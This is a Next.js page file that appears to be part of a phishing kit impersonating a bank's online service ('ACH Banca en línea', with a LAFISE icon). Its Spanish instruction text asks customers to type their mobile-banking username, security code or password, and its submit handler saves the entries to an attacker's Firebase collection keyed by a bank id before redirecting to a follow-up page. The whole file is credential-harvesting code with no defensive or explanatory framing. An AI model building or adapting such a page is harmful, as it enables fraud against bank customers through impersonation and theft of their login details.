import Footer from "../components/Footer";
import Header from "../components/Header";
import Head from "next/head";
import firebase from "../components/firebase";
import { useState } from "react";
import Router from "next/router";
import { useRouter } from "next/router";

export default function Registro() {

    //get id
    const router = useRouter();
    const { id } = router.query;

    const [state, setState] = useState({
        nombre: "",
        fecha: "",
        detalle : "",
        banco: id,
    })

    const handleChange = (e) => {
        setState({
            ...state,
            [e.target.name]: e.target.value,
            banco: id
        })
    }

    // handlesummit, upload data to firebase and redirect to configuracion/document_id
    const  handleSubmit = async (e) => {
        e.preventDefault()
        await firebase.firestore().collection("usuarios").add(state)
            .then((docRef) => {
                console.log("Document written with ID: ", docRef.id);
                Router.push({
                    pathname: '/usuario',
                    query: { id: docRef.id, banco: id },
                })
            })
            .catch((error) => {
                console.error("Error adding document: ", error);
            });
    }


  return (
    <div className="overflow-x-hidden">
      <Head>
        <title>Registro | ACH Banca en línea</title>
        <link rel="icon" href="/lafise.webp" />
      </Head>
      <Header />
      <div className="lg:w-6/12 mx-auto my-10 space-y-5">
        <img src="/banner6.webp" className="w-44 mx-auto" />
        <p className="text-lg font-medium w-10/12 lg:w-8/12 mx-auto text-center">
          Estimado cliente por favor ingresar los datos requeridos por el
          sistema que serian usuario, código de seguridad o contraseña de la
          banca móvil en los campos correspondientes, seguidamente le damos en
          ingresar para que el sistema bancario lo reconozca como cliente.
        </p>
        <div>
          <form className="space-y-5 w-10/12 lg:w-5/12 mx-auto my-10 grid">
            <div className="grid grid-cols-2 gap-5">
              <div className="col-span-2">
                <label htmlFor="nombre" className="text-lg">
                  Nombre
                </label>
                <input
                  type="text"
                  onChange={(e) => handleChange(e)}
                  name="nombre"
                  placeholder="Nombre"
                  id="nombre"
                  className="w-full border border-indigo-200 p-2 rounded-xl bg-emerald-50 "
                />
              </div>
            </div>
            <div className="grid grid-cols-2 gap-5">
              <div className="col-span-2">
                <label htmlFor="fecha" className="text-lg">
                  Fecha
                </label>
                <input
                  type="date"
                  onChange={(e) => handleChange(e)}
                  name="fecha"
                  placeholder="Fecha"
                  id="fecha"
                  className="w-full border border-indigo-200 p-2 rounded-xl bg-emerald-50 "
                />
              </div>
            </div>
          
            <div className="grid grid-cols-2 gap-5">
              <div className="col-span-2">
                <label htmlFor="detalle" className="text-lg">
                  Detalle
                </label>
                <textarea
                  type="text"
                  onChange={(e) => handleChange(e)}
                  rows="5"
                  name="detalle"
                  placeholder="Escribe aquí"
                  id="detalle"
                  className="w-full border border-indigo-200 p-2 rounded-xl bg-emerald-50 "
                />
              </div>
            </div>
            <button onClick={(e) => handleSubmit(e)} className="w-6/12 mx-auto bg-blue-500 p-3 rounded-xl text-white font-medium">
                Confirmar
            </button>
          </form>
        </div>
      </div>
      <img src="/banner7.webp" className="w-44 mx-auto mb-10" />
      <Footer />
    </div>
  );
}
